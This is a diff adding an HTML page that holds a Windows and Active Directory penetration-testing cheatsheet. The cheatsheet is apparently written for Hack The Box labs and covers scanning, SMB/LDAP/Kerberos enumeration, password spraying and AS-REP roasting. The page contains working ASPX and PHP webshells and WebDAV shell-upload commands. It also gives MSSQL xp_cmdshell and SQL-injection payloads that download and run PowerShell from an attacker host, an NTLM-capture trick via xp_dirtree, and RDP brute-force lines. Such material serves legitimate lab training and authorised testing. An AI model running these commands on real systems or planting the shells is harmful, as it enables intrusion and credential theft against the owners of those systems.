@@ -1,0 +1,2065 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="../assets/components.js"></script>
+  <style>
+    /* ── MD Cheatsheet Styles ── */
+    .md-h1 {
+      font-family: var(--mono);
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--text);
+      margin: 0 0 6px;
+    }
+
+    .md-h3 {
+      font-family: var(--mono);
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--accent);
+      margin: 24px 0 10px;
+      letter-spacing: .03em;
+    }
+
+    .md-h4 {
+      font-family: var(--mono);
+      font-size: 12px;
+      font-weight: 500;
+      color: var(--orange);
+      margin: 18px 0 8px;
+    }
+
+    .md-p {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--muted);
+      line-height: 1.8;
+      margin: 10px 0;
+    }
+
+    .md-hr {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 32px 0;
+    }
+
+    .md-ul,
+    .md-ol {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--muted);
+      line-height: 1.8;
+      padding-left: 20px;
+      margin: 8px 0;
+    }
+
+    .md-ul li,
+    .md-ol li {
+      margin: 2px 0;
+    }
+
+    .md-ol a,
+    .md-ul a {
+      color: #c4d4d4;
+      text-decoration: none;
+    }
+
+    .md-ol a:hover,
+    .md-ul a:hover {
+      text-decoration: underline;
+    }
+
+    .md-blockquote {
+      border-left: 3px solid var(--green);
+      padding: 8px 14px;
+      background: rgba(57, 211, 83, .05);
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--muted);
+      margin: 10px 0;
+      border-radius: 0 6px 6px 0;
+    }
+
+    .inline-code {
+      background: var(--surface2);
+      color: var(--accent);
+      padding: 1px 6px;
+      border-radius: 4px;
+      font-family: var(--mono);
+      font-size: 11px;
+      border: 1px solid var(--border);
+    }
+
+    .md-table-wrap {
+      overflow-x: auto;
+      margin: 14px 0;
+    }
+
+    .md-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-family: var(--mono);
+      font-size: 11px;
+    }
+
+    .md-table th {
+      background: var(--surface);
+      color: var(--text);
+      padding: 8px 12px;
+      border: 1px solid var(--border);
+      text-align: left;
+    }
+
+    .md-table td {
+      color: var(--muted);
+      padding: 7px 12px;
+      border: 1px solid var(--border);
+    }
+
+    .md-table tr:hover td {
+      background: var(--bg3);
+      color: var(--text);
+    }
+
+    .cm {
+      color: #3d4450;
+      font-style: italic;
+    }
+
+    .page-header {
+      margin-bottom: 32px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .page-header-sub {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+      margin-top: 6px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="page-content">
+
+    <div class="page-header">
+      <h1 class="md-h1">Windows & Active Directory Penetration Testing Cheatsheet</h1>
+      <div class="page-header-sub">by J0stif &nbsp;·&nbsp; Full Methodology: Recon → SYSTEM / Domain Admin</div>
+    </div>
+
+    <hr class="md-hr">
+    <div class="sec-hdr" id="table-of-contents" style="margin-top:36px"><span class="sec-title">📋 TABLE OF
+        CONTENTS</span><span class="sec-line"></span></div>
+    <ol class="md-ol">
+      <li><a href="#environment-setup">Environment Setup</a></li>
+      <li><a href="#phase-1-reconnaissance-port-scanning">Phase 1 — Reconnaissance & Port Scanning</a></li>
+      <li><a href="#phase-2-windows-service-enumeration">Phase 2 — Windows Service Enumeration</a></li>
+      <li><a href="#phase-3-active-directory-enumeration">Phase 3 — Active Directory Enumeration</a></li>
+      <li><a href="#phase-4-web-application-attacks">Phase 4 — Web Application Attacks</a></li>
+      <li><a href="#phase-5-initial-access-exploitation">Phase 5 — Initial Access & Exploitation</a></li>
+      <li><a href="#phase-6-post-exploitation-situational-awareness">Phase 6 — Post-Exploitation & Situational
+          Awareness</a></li>
+      <li><a href="#phase-7-windows-privilege-escalation">Phase 7 — Windows Privilege Escalation</a></li>
+      <li><a href="#phase-8-active-directory-attacks">Phase 8 — Active Directory Attacks</a></li>
+      <li><a href="#phase-9-lateral-movement">Phase 9 — Lateral Movement</a></li>
+      <li><a href="#phase-10-domain-compromise-dcsync">Phase 10 — Domain Compromise & DCSync</a></li>
+      <li><a href="#phase-11-credential-dumping-loot">Phase 11 — Credential Dumping & Loot</a></li>
+      <li><a href="#file-transfer-techniques">File Transfer Techniques</a></li>
+      <li><a href="#shells-listeners">Shells & Listeners</a></li>
+      <li><a href="#wordlists-resources">Wordlists & Resources</a></li>
+    </ol>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="environment-setup" style="margin-top:36px"><span class="sec-title">🛠️ Environment
+        Setup</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Set your variables — use everywhere</span>
+        export IP=10.10.11.XXX
+        export LHOST=10.10.14.XXX <span class="cm"># your tun0 IP</span>
+        export LPORT=4444
+        export DOMAIN=domain.htb
+        export DC=dc.domain.htb
+
+        <span class="cm"># Add to /etc/hosts</span>
+        echo "$IP $DOMAIN $DC" &gt;&gt; /etc/hosts
+
+        <span class="cm"># Working directory</span>
+        mkdir -p ~/htb/machinename/{nmap,smb,ldap,web,loot,exploits,bloodhound}
+        cd ~/htb/machinename
+
+        <span class="cm"># Install/verify key tools</span>
+        which crackmapexec impacket-secretsdump bloodhound-python evil-winrm
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-1-reconnaissance-port-scanning" style="margin-top:36px"><span class="sec-title">Phase
+        1 — Reconnaissance & Port Scanning</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="11-nmap">1.1 Nmap</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Fast full port scan first</span>
+        nmap -p- --min-rate=5000 -T4 $IP -oN nmap/all_ports.txt
+
+        <span class="cm"># Service/version/script scan on found ports</span>
+        nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3389,5985 -sC -sV -O $IP -oN nmap/targeted.txt
+
+        <span class="cm"># UDP — important for AD (Kerberos, DNS, SNMP)</span>
+        sudo nmap -sU --top-ports 100 $IP -oN nmap/udp.txt
+
+        <span class="cm"># Windows-specific scripts</span>
+        nmap --script smb-security-mode,smb-os-discovery,smb2-security-mode -p 445 $IP
+        nmap --script ldap-rootdse -p 389 $IP
+        nmap --script msrpc-enum -p 135 $IP
+      </div>
+    </div>
+    <h3 class="md-h3" id="12-common-windows-ad-ports">1.2 Common Windows / AD Ports</h3>
+    <div class="md-table-wrap">
+      <table class="md-table">
+        <tr>
+          <th>Port</th>
+          <th>Service</th>
+          <th>Notes</th>
+        </tr>
+        <tr>
+          <td>53</td>
+          <td>DNS</td>
+          <td>Zone transfers, domain name</td>
+        </tr>
+        <tr>
+          <td>80/443</td>
+          <td>HTTP/HTTPS</td>
+          <td>Web apps, admin panels</td>
+        </tr>
+        <tr>
+          <td>88</td>
+          <td>Kerberos</td>
+          <td>AS-REP roasting, brute force</td>
+        </tr>
+        <tr>
+          <td>135</td>
+          <td>RPC</td>
+          <td>MSRPC endpoint mapper</td>
+        </tr>
+        <tr>
+          <td>139/445</td>
+          <td>SMB</td>
+          <td>File shares, relay attacks</td>
+        </tr>
+        <tr>
+          <td>389/636</td>
+          <td>LDAP/LDAPS</td>
+          <td>AD enumeration</td>
+        </tr>
+        <tr>
+          <td>464</td>
+          <td>Kpasswd</td>
+          <td>Kerberos password change</td>
+        </tr>
+        <tr>
+          <td>593</td>
+          <td>HTTP RPC</td>
+          <td>RPC over HTTP</td>
+        </tr>
+        <tr>
+          <td>3268/3269</td>
+          <td>Global Catalog</td>
+          <td>LDAP across domains</td>
+        </tr>
+        <tr>
+          <td>3389</td>
+          <td>RDP</td>
+          <td>Remote Desktop</td>
+        </tr>
+        <tr>
+          <td>5985/5986</td>
+          <td>WinRM</td>
+          <td>Evil-WinRM / PS remoting</td>
+        </tr>
+        <tr>
+          <td>1433</td>
+          <td>MSSQL</td>
+          <td>SQL Server</td>
+        </tr>
+        <tr>
+          <td>5432</td>
+          <td>PostgreSQL</td>
+          <td>Less common on Windows</td>
+        </tr>
+        <tr>
+          <td>8080</td>
+          <td>HTTP alt</td>
+          <td>Admin / dev panels</td>
+        </tr>
+      </table>
+    </div>
+
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-2-windows-service-enumeration" style="margin-top:36px"><span class="sec-title">Phase
+        2 — Windows Service Enumeration</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="21-smb-enumeration">2.1 SMB Enumeration</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Null session enumeration</span>
+        smbclient -L //$IP -N
+        smbclient //$IP/share_name -N
+
+        <span class="cm"># CrackMapExec (most useful tool for SMB)</span>
+        crackmapexec smb $IP
+        crackmapexec smb $IP -u '' -p '' --shares
+        crackmapexec smb $IP -u 'guest' -p '' --shares
+        crackmapexec smb $IP -u 'guest' -p '' --rid-brute
+        crackmapexec smb $IP -u user -p 'pass' --shares
+        crackmapexec smb $IP -u user -p 'pass' --users
+        crackmapexec smb $IP -u user -p 'pass' --groups
+        crackmapexec smb $IP -u user -p 'pass' --sessions
+        crackmapexec smb $IP -u user -p 'pass' --loggedon-users
+        crackmapexec smb $IP -u user -p 'pass' --pass-pol
+
+        <span class="cm"># Enum4linux-ng</span>
+        enum4linux-ng -A $IP
+        enum4linux-ng -A -u user -p pass $IP
+
+        <span class="cm"># smbmap — list and check permissions</span>
+        smbmap -H $IP
+        smbmap -H $IP -u '' -p ''
+        smbmap -H $IP -u user -p 'pass'
+        smbmap -H $IP -u user -p 'pass' -R <span class="cm"># recursive</span>
+        smbmap -H $IP -u user -p 'pass' -R share <span class="cm"># recursive on specific share</span>
+        smbmap -H $IP -u user -p 'pass' --download 'share\file.txt'
+
+        <span class="cm"># Connect to share interactively</span>
+        smbclient //$IP/share -U user%pass
+        smbclient //$IP/share -U 'domain\user%pass'
+
+        <span class="cm"># SMBclient commands</span>
+        smb&gt; ls
+        smb&gt; get file.txt
+        smb&gt; put local.txt
+        smb&gt; recurse on
+        smb&gt; prompt off
+        smb&gt; mget *
+
+        <span class="cm"># Download all files from share</span>
+        smbget -R smb://$IP/share -U user%pass
+
+        <span class="cm"># Mount share</span>
+        mount -t cifs //$IP/share /mnt/smb -o username=user,password=pass,domain=domain.htb
+
+        <span class="cm"># Nmap SMB vuln check</span>
+        nmap --script smb-vuln* -p 445 $IP
+        nmap --script smb-enum-shares,smb-enum-users,smb-enum-groups,smb-os-discovery -p 445 $IP
+      </div>
+    </div>
+    <h3 class="md-h3" id="22-rpc-enumeration">2.2 RPC Enumeration</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># rpcclient</span>
+        rpcclient -U "" -N $IP
+        rpcclient -U "user%pass" $IP
+
+        <span class="cm"># Inside rpcclient:</span>
+        enumdomusers <span class="cm"># list users</span>
+        enumdomgroups <span class="cm"># list groups</span>
+        enumalsgroups domain <span class="cm"># alias groups</span>
+        querydominfo <span class="cm"># domain info</span>
+        queryuser 0x1f4 <span class="cm"># query user by RID</span>
+        querygroupmem 0x200 <span class="cm"># members of group</span>
+        lookupnames admin <span class="cm"># SID lookup</span>
+        lookupsids S-1-5-21-... <span class="cm"># reverse SID lookup</span>
+        getdompwinfo <span class="cm"># password policy</span>
+        srvinfo <span class="cm"># server info</span>
+        netshareenumall <span class="cm"># all shares</span>
+
+        <span class="cm"># Impacket — RPC dump</span>
+        impacket-rpcdump $IP
+        impacket-rpcdump $IP -p 593 <span class="cm"># HTTP RPC</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="23-rdp-port-3389">2.3 RDP (Port 3389)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Check if RDP is open / get info</span>
+        nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 $IP
+
+        <span class="cm"># Connect</span>
+        xfreerdp /v:$IP /u:user /p:'password'
+        xfreerdp /v:$IP /u:user /p:'password' /d:domain.htb
+        xfreerdp /v:$IP /u:user /p:'password' /d:domain.htb /cert:ignore +clipboard
+        xfreerdp /v:$IP /u:user /pth:NTLM_HASH /d:domain.htb /cert:ignore <span class="cm"># pass-the-hash</span>
+
+        <span class="cm"># Remmina GUI</span>
+        remmina
+
+        <span class="cm"># Brute force RDP</span>
+        hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://$IP -t 4
+        crowbar -b rdp -s $IP/32 -u user -C /usr/share/wordlists/rockyou.txt
+      </div>
+    </div>
+    <h3 class="md-h3" id="24-winrm-port-59855986">2.4 WinRM (Port 5985/5986)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Check WinRM</span>
+        crackmapexec winrm $IP -u user -p 'pass'
+        crackmapexec winrm $IP -u user -H NTLM_HASH
+
+        <span class="cm"># Evil-WinRM (best WinRM client)</span>
+        evil-winrm -i $IP -u user -p 'password'
+        evil-winrm -i $IP -u user -H NTLM_HASH
+        evil-winrm -i $IP -u user -p 'password' -S <span class="cm"># SSL (port 5986)</span>
+
+        <span class="cm"># Inside Evil-WinRM</span>
+        upload /local/file.exe C:\Windows\Temp\file.exe
+        download C:\Users\user\Desktop\file.txt ./file.txt
+        menu <span class="cm"># see built-in commands</span>
+
+        <span class="cm"># PowerShell Remoting (from Windows)</span>
+        Enter-PSSession -ComputerName $IP -Credential (Get-Credential)
+        Invoke-Command -ComputerName $IP -Credential (Get-Credential) -ScriptBlock { whoami }
+      </div>
+    </div>
+    <h3 class="md-h3" id="25-dns-enumeration">2.5 DNS Enumeration</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Zone transfer</span>
+        dig axfr @$IP $DOMAIN
+        host -l $DOMAIN $IP
+        dnsrecon -d $DOMAIN -t axfr
+
+        <span class="cm"># Brute force subdomains</span>
+        gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r $IP -t 30
+        ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://$DOMAIN -H "Host:
+        FUZZ.$DOMAIN" -fs [size]
+
+        <span class="cm"># DNSRecon</span>
+        dnsrecon -d $DOMAIN -n $IP
+        dnsrecon -d $DOMAIN -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+
+        <span class="cm"># Nslookup</span>
+        nslookup
+        &gt; server $IP
+        &gt; $DOMAIN
+        &gt; set type=MX
+        &gt; $DOMAIN
+      </div>
+    </div>
+    <h3 class="md-h3" id="26-mssql-port-1433">2.6 MSSQL (Port 1433)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Enumerate</span>
+        nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p 1433 $IP
+
+        <span class="cm"># Connect with Impacket</span>
+        impacket-mssqlclient user:password@$IP
+        impacket-mssqlclient user:password@$IP -windows-auth
+
+        <span class="cm"># Connect with CrackMapExec</span>
+        crackmapexec mssql $IP -u user -p 'pass'
+        crackmapexec mssql $IP -u user -p 'pass' -q "SELECT @@version"
+
+        <span class="cm"># Inside MSSQL CLI (impacket-mssqlclient)</span>
+        SQL&gt; SELECT @@version;
+        SQL&gt; SELECT DB_NAME();
+        SQL&gt; SELECT name FROM sys.databases;
+        SQL&gt; USE database;
+        SQL&gt; SELECT table_name FROM information_schema.tables;
+        SQL&gt; SELECT name FROM sys.syslogins;
+
+        <span class="cm"># Enable xp_cmdshell</span>
+        SQL&gt; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+        SQL&gt; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+        SQL&gt; EXEC xp_cmdshell 'whoami';
+        SQL&gt; EXEC xp_cmdshell 'powershell -c "IEX(New-Object
+        Net.WebClient).DownloadString(''http://IP/shell.ps1'')"';
+
+        <span class="cm"># NTLM capture via MSSQL (responder + xp_dirtree)</span>
+        SQL&gt; EXEC xp_dirtree '\\LHOST\share'; <span class="cm"># triggers NTLM auth</span>
+        SQL&gt; EXEC xp_fileexist '\\LHOST\share\file';
+
+        <span class="cm"># Read/write files</span>
+        SQL&gt; SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
+
+        <span class="cm"># Linked servers</span>
+        SQL&gt; SELECT * FROM sys.servers;
+        SQL&gt; EXEC ('SELECT @@version') AT [linkedserver];
+        SQL&gt; EXEC ('xp_cmdshell ''whoami''') AT [linkedserver];
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-3-active-directory-enumeration" style="margin-top:36px"><span class="sec-title">Phase
+        3 — Active Directory Enumeration</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="31-ldap-enumeration">3.1 LDAP Enumeration</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Anonymous / guest LDAP</span>
+        ldapsearch -x -H ldap://$IP -b "DC=domain,DC=htb"
+        ldapsearch -x -H ldap://$IP -b "" -s base namingContexts
+
+        <span class="cm"># Authenticated</span>
+        ldapsearch -x -H ldap://$IP -D "user@domain.htb" -w 'password' -b "DC=domain,DC=htb"
+        ldapsearch -x -H ldap://$IP -D "user@domain.htb" -w 'password' -b "DC=domain,DC=htb" "(objectClass=user)"
+        sAMAccountName
+        ldapsearch -x -H ldap://$IP -D "user@domain.htb" -w 'password' -b "DC=domain,DC=htb" "(objectClass=group)"
+        ldapsearch -x -H ldap://$IP -D "user@domain.htb" -w 'password' -b "DC=domain,DC=htb" "(objectClass=computer)"
+
+        <span class="cm"># Find Domain Admins</span>
+        ldapsearch -x -H ldap://$IP -D "user@domain.htb" -w 'password' -b "DC=domain,DC=htb" "(memberOf=CN=Domain
+        Admins,CN=Users,DC=domain,DC=htb)"
+
+        <span class="cm"># Enumerate with windapsearch</span>
+        windapsearch -m users --dc $IP
+        windapsearch -m groups --dc $IP
+        windapsearch -m domain-admins --dc $IP
+        windapsearch -m computers --dc $IP
+        windapsearch -m custom --filter "(objectClass=user)" -A sAMAccountName,description --dc $IP
+
+        <span class="cm"># ldapdomaindump (HTML output)</span>
+        ldapdomaindump $IP -u 'domain.htb\user' -p 'password' -o ldap/
+      </div>
+    </div>
+    <h3 class="md-h3" id="32-bloodhound-enumeration">3.2 BloodHound Enumeration</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Python BloodHound collector (run from Kali)</span>
+        pip3 install bloodhound
+        bloodhound-python -u user -p 'password' -d domain.htb -ns $IP -c All --zip
+        bloodhound-python -u user -p '' -d domain.htb -ns $IP -c All --zip <span class="cm"># guest</span>
+        bloodhound-python -u user --hashes :NTLM_HASH -d domain.htb -ns $IP -c All --zip
+
+        <span class="cm"># SharpHound (run from Windows victim)</span>
+        .\SharpHound.exe -c All --zipfilename loot.zip
+        .\SharpHound.exe -c All,GPOLocalGroup --zipfilename loot.zip
+        powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/SharpHound.ps1');
+        Invoke-BloodHound -c All -OutputDirectory C:\Temp"
+
+        <span class="cm"># Start BloodHound</span>
+        sudo neo4j start
+        bloodhound &amp;
+        <span class="cm"># Login: neo4j:neo4j (change on first run)</span>
+        <span class="cm"># Upload zip file, then use queries</span>
+
+        <span class="cm"># Key BloodHound queries:</span>
+        <span class="cm"># Find all Domain Admins</span>
+        <span class="cm"># Find shortest path to Domain Admin</span>
+        <span class="cm"># Find principals with DCSync rights</span>
+        <span class="cm"># Find computers where Domain Users can RDP</span>
+        <span class="cm"># Find AS-REP Roastable users</span>
+        <span class="cm"># Find Kerberoastable users</span>
+        <span class="cm"># Find users with constrained delegation</span>
+        <span class="cm"># Find computers with unconstrained delegation</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="33-user-enumeration">3.3 User Enumeration</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Kerbrute — username enum against Kerberos (no auth needed)</span>
+        kerbrute userenum -d domain.htb --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+        kerbrute userenum -d domain.htb --dc $IP users.txt -t 50
+
+        <span class="cm"># CrackMapExec — RID brute (null or guest)</span>
+        crackmapexec smb $IP -u '' -p '' --rid-brute
+        crackmapexec smb $IP -u 'guest' -p '' --rid-brute
+
+        <span class="cm"># Impacket lookupsid</span>
+        impacket-lookupsid guest@$IP -no-pass
+        impacket-lookupsid guest@$IP -no-pass | grep "SidTypeUser"
+        impacket-lookupsid domain.htb/user:pass@$IP
+
+        <span class="cm"># SMB user enum</span>
+        enum4linux-ng -U $IP
+        rpcclient -U "" -N $IP -c "enumdomusers"
+
+        <span class="cm"># Extract usernames from LDAP dump</span>
+        cat ldap/domain_users.json | python3 -c "import sys,json; [print(u['attributes']['sAMAccountName']) for u in
+        json.load(sys.stdin) if u.get('attributes')]" &gt; users.txt
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-4-web-application-attacks" style="margin-top:36px"><span class="sec-title">Phase 4 —
+        Web Application Attacks</span><span class="sec-line"></span></div>
+    <blockquote class="md-blockquote">See the Linux Cheatsheet for full web attack coverage. Windows-specific additions
+      below.</blockquote>
+    <h3 class="md-h3" id="41-iis-specific-enumeration">4.1 IIS-Specific Enumeration</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># IIS version detection</span>
+        nmap --script http-iis-webdav-vuln,http-iis-short-name-brute -p 80,443 $IP
+        curl -I http://$IP <span class="cm"># look for Server: Microsoft-IIS/X.X</span>
+
+        <span class="cm"># Common IIS paths</span>
+        http://$IP/iisstart.htm
+        http://$IP/_vti_bin/
+        http://$IP/aspnet_client/
+        http://$IP/Trace.axd
+        http://$IP/elmah.axd
+        http://$IP/web.config <span class="cm"># try to read (403 = exists)</span>
+        http://$IP/.git/ <span class="cm"># git repo leak</span>
+        http://$IP/backup.zip
+
+        <span class="cm"># WebDAV check</span>
+        davtest -url http://$IP
+        cadaver http://$IP
+
+        <span class="cm"># WebDAV upload .aspx shell</span>
+        davtest -url http://$IP -uploadfile shell.aspx -uploadloc shell.aspx
+        curl -X PUT http://$IP/shell.aspx -d @shell.aspx
+
+        <span class="cm"># Short name brute force (IIS 8.3 filename leak)</span>
+        java -jar iis_shortname_scanner.jar 2 20 http://$IP/
+      </div>
+    </div>
+    <h3 class="md-h3" id="42-aspaspx-webshells">4.2 ASP/ASPX Webshells</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">aspx</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">&lt;!-- simple cmd webshell --&gt;
+        &lt;%@ Page Language="C<span class="cm">#" %&gt;</span>
+        &lt;%@ Import Namespace="System.Diagnostics" %&gt;
+        &lt;%
+        string cmd = Request.QueryString["cmd"];
+        Process p = new Process();
+        p.StartInfo.FileName = "cmd.exe";
+        p.StartInfo.Arguments = "/c " + cmd;
+        p.StartInfo.UseShellExecute = false;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.Start();
+        Response.Write("&lt;pre&gt;" + p.StandardOutput.ReadToEnd() + "&lt;/pre&gt;");
+        %&gt;</div>
+    </div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">php</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">&lt;!-- PHP on IIS --&gt;
+        &lt;?php system($_GET['cmd']); ?&gt;</div>
+    </div>
+    <h3 class="md-h3" id="43-sql-injection-on-windows-mssql">4.3 SQL Injection on Windows / MSSQL</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># MSSQL error-based SQLi detection</span>
+        ' ; SELECT @@version --
+        '; EXEC xp_cmdshell('whoami') --
+        '; EXEC master.dbo.xp_cmdshell 'ping $LHOST' --
+
+        <span class="cm"># Enable xp_cmdshell via SQLi</span>
+        '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE --
+        '; EXEC xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString(\"http://$LHOST/shell.ps1\")' --
+
+        <span class="cm"># SQLMap with MSSQL</span>
+        sqlmap -u "http://$IP/page?id=1" --dbms=mssql --os-shell
+        sqlmap -u "http://$IP/page?id=1" --dbms=mssql --technique=E --dbs
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-5-initial-access-exploitation" style="margin-top:36px"><span class="sec-title">Phase
+        5 — Initial Access & Exploitation</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="51-password-spraying">5.1 Password Spraying</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># CrackMapExec — SMB</span>
+        crackmapexec smb $IP -u users.txt -p 'Password123' --continue-on-success
+        crackmapexec smb $IP -u users.txt -p passwords.txt --continue-on-success
+        crackmapexec smb $IP -u users.txt -p 'Password123' -d domain.htb
+
+        <span class="cm"># CrackMapExec — WinRM</span>
+        crackmapexec winrm $IP -u users.txt -p 'Password123' --continue-on-success
+
+        <span class="cm"># Kerbrute — password spray (safer, no lockout if careful)</span>
+        kerbrute passwordspray -d domain.htb --dc $IP users.txt 'Password123'
+
+        <span class="cm"># Hydra — WinRM</span>
+        hydra -L users.txt -p 'Password123' $IP http-post-form "/wsman:..."
+
+        <span class="cm"># Rule: Stay under lockout threshold (typically 5 bad attempts)</span>
+        <span class="cm"># Check password policy first!</span>
+        crackmapexec smb $IP -u '' -p '' --pass-pol
+      </div>
+    </div>
+    <h3 class="md-h3" id="52-as-rep-roasting-no-pre-auth-required">5.2 AS-REP Roasting (No Pre-Auth Required)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Get AS-REP hash (no creds needed if user has "Do not require Kerberos
+          preauthentication")</span>
+        impacket-GetNPUsers domain.htb/ -dc-ip $IP -no-pass -usersfile users.txt
+        impacket-GetNPUsers domain.htb/ -dc-ip $IP -no-pass -request
+        impacket-GetNPUsers domain.htb/user:pass -dc-ip $IP -request <span class="cm"># with auth (gets all)</span>
+
+        <span class="cm"># Crack the hash</span>
+        hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+        john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+        <span class="cm"># Hash format example:</span>
+        <span class="cm"># $krb5asrep$23$user@DOMAIN.HTB:...</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="53-kerberoasting">5.3 Kerberoasting</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
